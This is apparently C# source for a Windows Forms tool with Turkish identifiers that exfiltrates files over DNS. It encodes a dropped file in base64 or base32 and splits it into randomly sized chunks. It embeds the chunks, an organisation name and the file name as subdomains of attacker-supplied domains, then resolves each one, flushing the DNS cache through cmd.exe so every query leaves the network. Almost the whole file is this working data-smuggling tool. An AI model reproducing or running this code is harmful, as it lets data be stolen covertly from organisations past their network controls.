using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace SimdiBaslaForm
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private const int InByteSize = 8;
        private static string islemNo;
        private const int OutByteSize = 5;

        private const string Base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        string[] DomainListesi;
        byte[] content;
        List<String> Domain_List = new List<string>();
        System.Net.NetworkInformation.Ping png = new System.Net.NetworkInformation.Ping();
        List<string> dizi = new List<string>();
        List<string> veri_dizisi = new List<string>();
        string[] dosyaYolu;
        string yollanacak_veri;
        string[] dosyaAdi;
        private void textBox1_DragDrop(object sender, DragEventArgs e)
        {
            dosyaYolu = (string[])e.Data.GetData(DataFormats.FileDrop);
            StreamReader oku;
            DomainListesi = File.ReadAllLines(dosyaYolu[0]);
            textBox1.Text = dosyaYolu[0];
           
           
          
               
            foreach(string i in DomainListesi)
            {
                Domain_List.Add(i);
            }
           
         
         
        }

        private void textBox1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop, false) == true)
                e.Effect = DragDropEffects.All;
        }
        ErrorProvider er = new ErrorProvider();
        string hata;
      
        private void button1_Click(object sender, EventArgs e)
        {
            kontrol:
            
           
            if(textBox4.Text.Length!=3)
            {
                er.SetError(textBox4,"Hatalı anahtar boyutu lütfen 3 haneli olarak giriniz");
                hata = "1";
              
            }
            else
            {
                hata = "";
            }
            if(textBox3.Text=="")
            {
                er.SetError(textBox3, "Hatalı Kurum adi");
                hata = "1";
            }
            else
            {
                hata = "";
            }
           

            int timeOut=Convert.ToInt32(textBox5.Text);
           
            if (hata != "1")
            {
                MessageBox.Show("Transfer Başladı");
              /*  string y = System.Convert.ToBase64String(GetBytes(textBox3.Text));
                string[] kurum = Regex.Split(y, "=");
                string dosya = System.Convert.ToBase64String(GetBytes(dosyaAdi[dosyaAdi.Count() - 1]));
                string[] dosyaNew = Regex.Split(dosya, "=");

                dizi.Add(kurum[0]);
                dizi.Add(dosyaNew[0]);*/
           

                EnBas:
                if (radioButton1.Checked == true)
                {
                    islemNo = "1";
                    string y = System.Convert.ToBase64String(GetBytes(textBox3.Text));
                    string[] kurum = Regex.Split(y, "=");
                    string dosya = System.Convert.ToBase64String(GetBytes(dosyaAdi[dosyaAdi.Count() - 1]));
                    string[] dosyaNew = Regex.Split(dosya, "=");

                    dizi.Add(kurum[0]);
                    dizi.Add(dosyaNew[0]);

                    dizi.Add(islemNo);
                    try
                    {

                        string result1 = System.Convert.ToBase64String(content);
                        StreamWriter a = new StreamWriter("okan.txt");
                        a.WriteLine(result1);
                        a.Close();
                        byte[] content2 = File.ReadAllBytes(@"okan.txt");
                        string result = GetString(content2);
                        int diziBoyutu = result.Length - 1, index = 0;
                        int sayac = result.Length;


                        int kalan;
                        while (sayac > 16)
                        {
                            sayac -= 16;
                            dizi.Add(result.Substring(index, 18));
                            index += 16;
                        }
                        kalan = sayac;
                        dizi.Add(result.Substring(index, kalan) + "sifr");
                        string son = "bitti";

                        dizi.Add(son);
                        for (int i = 0; i < dizi.Count; i++)
                        {


                            yollanacak_veri = i + textBox4.Text + "-" + dizi[i] + "." + Domain_List[i % (Domain_List.Count)];
                            veri_dizisi.Add(yollanacak_veri);

                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Hatalı dosya:" + ex.Message);

                    }
                }
                else if (radioButton2.Checked == true)
                {
                    islemNo = "2";
                    string y = System.Convert.ToBase64String(GetBytes(textBox3.Text));
                    string[] kurum = Regex.Split(y, "=");
                    string dosya = System.Convert.ToBase64String(GetBytes(dosyaAdi[dosyaAdi.Count() - 1]));
                    string[] dosyaNew = Regex.Split(dosya, "=");

                    dizi.Add(kurum[0]);
                    dizi.Add(dosyaNew[0]);

                    dizi.Add(islemNo);

                    try
                    {


                        string result = System.Convert.ToBase64String(content);
                        result = result.Replace("/", "bolu");
                        result = result.Replace("+", "arti");
                        int diziBoyutu = result.Length - 1, index = 0;
                        int sayac = result.Length;
                        Random random = new Random();
                        int boyut = random.Next(30, 52);

                        int kalan;
                        while (sayac > boyut)
                        {
                            boyut = random.Next(30, 52);
                            sayac -= boyut;
                            dizi.Add(result.Substring(index, boyut));
                            index += boyut;
                        }
                        kalan = sayac;
                        string yaa = result.Substring(index, kalan);
                        string[] ya = Regex.Split(yaa, "=");
                        dizi.Add(ya[0]);
                        string son = "bitti";

                        dizi.Add(son);
                        for (int i = 0; i < dizi.Count; i++)
                        {

                            yollanacak_veri = i + textBox4.Text + "-" + dizi[i] + "." + Domain_List[i % (Domain_List.Count)];
                            veri_dizisi.Add(yollanacak_veri);

                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Hatalı dosya:" + ex.Message);

                    }
                }
                else if (radioButton3.Checked == true)
                {
                    islemNo = "3";
                    string y = ToBase32String(GetBytes(textBox3.Text));
                    string[] kurum = Regex.Split(y, "=");
                    string dosya = ToBase32String(GetBytes(dosyaAdi[dosyaAdi.Count() - 1]));
                    string[] dosyaNew = Regex.Split(dosya, "=");

                    dizi.Add(kurum[0]);
                    dizi.Add(dosyaNew[0]);

                    dizi.Add(islemNo);
                    try
                    {


                        string result = ToBase32String(content);
                        result = result.Replace("/", "bolu");
                        result = result.Replace("+", "arti");
                        int diziBoyutu = result.Length - 1, index = 0;
                        int sayac = result.Length;
                        Random random = new Random();
                        int boyut = random.Next(30, 52);

                        int kalan;
                        while (sayac > boyut)
                        {
                            boyut = random.Next(30, 52);
                            sayac -= boyut;
                            dizi.Add(result.Substring(index, boyut));
                            index += boyut;
                        }
                        kalan = sayac;
                        string y2 = result.Substring(index, kalan);
                        string[] ya = Regex.Split(y2, "=");
                        dizi.Add(ya[0]);
                        string son = "bitti";

                        dizi.Add(son);
                        for (int i = 0; i < dizi.Count; i++)
                        {


                            yollanacak_veri = i + textBox4.Text + "-" + dizi[i] + "." + Domain_List[i % (Domain_List.Count)];
                            veri_dizisi.Add(yollanacak_veri);

                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Hatalı dosya:" + ex.Message);

                    }
                }
                else
                {
                    MessageBox.Show("Kaçırma türü seçilmedi ve otomatik olarak byte ayarlandı");
                    radioButton1.Checked = true;
                    goto EnBas;

                }
                IPAddress[] ip;


                for (int i = 0; i < veri_dizisi.Count; i++)
                {
                    System.Threading.Thread.Sleep(timeOut);
                    for (int j = 0; j < 2; j++)
                    {
                        System.Threading.Thread.Sleep(timeOut);
                        Ping ping = new Ping();
                        try
                        {
                            string komut = "ipconfig /flushdns";
                            Process Process = new Process();
                            ProcessStartInfo ProcessInfo;
                            ProcessInfo = new ProcessStartInfo("cmd.exe", "/C " + komut);
                            ProcessInfo.CreateNoWindow = true;
                            ProcessInfo.UseShellExecute = false;

                            Process = Process.Start(ProcessInfo);
                            Process.WaitForExit();
                            Process.Close();


                            IPHostEntry dns_bilgi = Dns.GetHostEntry(veri_dizisi[i]);

                            ip = dns_bilgi.AddressList;
                            foreach (IPAddress ipp in ip)
                            {
                                MessageBox.Show("adres:" + veri_dizisi[i] + " ip:" + ipp);
                            }

                            // PingReply DonenCevap = ping.Send(veri_dizisi[i]);
                        }
                        catch (Exception ex)
                        {
                            listBox1.Items.Add("adres:" + veri_dizisi[i] + " böyle bir adres yok");

                        }
                    }
                }

                MessageBox.Show("Başarıyla Sonlandı");
            }
        }

        private void textBox2_DragDrop(object sender, DragEventArgs e)
        {
            string[] dosyaYolu = (string[])e.Data.GetData(DataFormats.FileDrop);
            StreamReader oku;
            content = File.ReadAllBytes(dosyaYolu[0]);
            dosyaAdi = dosyaYolu[0].Split('\\');
            textBox2.Text = (dosyaAdi[dosyaAdi.Count() - 1]);

        }

        private void textBox2_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop, false) == true)
                e.Effect = DragDropEffects.All;

        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
          
            radioButton1.Checked = true;
            string komuta = "ipconfig /flushdns";
            Process Process1 = new Process();
            ProcessStartInfo ProcessInfo1;
            ProcessInfo1 = new ProcessStartInfo("cmd.exe", "/C " + komuta);
            ProcessInfo1.CreateNoWindow = true;
            ProcessInfo1.UseShellExecute = false;

            Process1 = Process.Start(ProcessInfo1);
            Process1.WaitForExit();
            Process1.Close();
        }
        private static string GetString(byte[] bytes)
        {
            if (bytes.Length % 2 != 0)
            {
                byte[] newArray = new byte[bytes.Length + 1];
                bytes.CopyTo(newArray, 1);
                newArray[0] = byte.Parse("0");
                bytes = newArray;
            }
            char[] chars = new char[bytes.Length / sizeof(char)];
            System.Buffer.BlockCopy(bytes, 0, chars, 0, bytes.Length);
            return new string(chars);
        }
        public static byte[] GetBytes(string str)
        {
            byte[] bytes = new byte[str.Length * sizeof(char)];
            System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);
            return bytes;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
            Domain_List.Clear();
            dizi.Clear();
            veri_dizisi.Clear();
            if (dosyaYolu != null)
            {
                Array.Clear(dosyaYolu, 0, dosyaYolu.Length);
            }
            Array.Clear(content, 0, content.Length);
            listBox1.Items.Clear();
            textBox1.Text = "";
            textBox2.Text = "";
            textBox3.Text = "";
            textBox4.Text = "";
            textBox5.Text = "";
        }
        private static string ToBase32String(byte[] bytes)
        {
            // Check if byte array is null
            if (bytes == null)
            {
                return null;
            }
            // Check if empty
            else if (bytes.Length == 0)
            {
                return string.Empty;
            }

            // Prepare container for the final value
            StringBuilder builder = new StringBuilder(bytes.Length * InByteSize / OutByteSize);

            // Position in the input buffer
            int bytesPosition = 0;

            // Offset inside a single byte that <bytesPosition> points to (from left to right)
            // 0 - highest bit, 7 - lowest bit
            int bytesSubPosition = 0;

            // Byte to look up in the dictionary
            byte outputBase32Byte = 0;

            // The number of bits filled in the current output byte
            int outputBase32BytePosition = 0;

            // Iterate through input buffer until we reach past the end of it
            while (bytesPosition < bytes.Length)
            {
                // Calculate the number of bits we can extract out of current input byte to fill missing bits in the output byte
                int bitsAvailableInByte = Math.Min(InByteSize - bytesSubPosition, OutByteSize - outputBase32BytePosition);

                // Make space in the output byte
                outputBase32Byte <<= bitsAvailableInByte;

                // Extract the part of the input byte and move it to the output byte
                outputBase32Byte |= (byte)(bytes[bytesPosition] >> (InByteSize - (bytesSubPosition + bitsAvailableInByte)));

                // Update current sub-byte position
                bytesSubPosition += bitsAvailableInByte;

                // Check overflow
                if (bytesSubPosition >= InByteSize)
                {
                    // Move to the next byte
                    bytesPosition++;
                    bytesSubPosition = 0;
                }

                // Update current base32 byte completion
                outputBase32BytePosition += bitsAvailableInByte;

                // Check overflow or end of input array
                if (outputBase32BytePosition >= OutByteSize)
                {
                    // Drop the overflow bits
                    outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary

                    // Add current Base32 byte and convert it to character
                    builder.Append(Base32Alphabet[outputBase32Byte]);

                    // Move to the next byte
                    outputBase32BytePosition = 0;
                }
            }

            // Check if we have a remainder
            if (outputBase32BytePosition > 0)
            {
                // Move to the right bits
                outputBase32Byte <<= (OutByteSize - outputBase32BytePosition);

                // Drop the overflow bits
                outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary

                // Add current Base32 byte and convert it to character
                builder.Append(Base32Alphabet[outputBase32Byte]);
            }

            return builder.ToString();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void radioButton2_KeyPress(object sender, KeyPressEventArgs e)
        {

        }

        private void textBox4_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (textBox4.TextLength == 10)
            {
                e.Handled = true;
            }
        }
    }
}
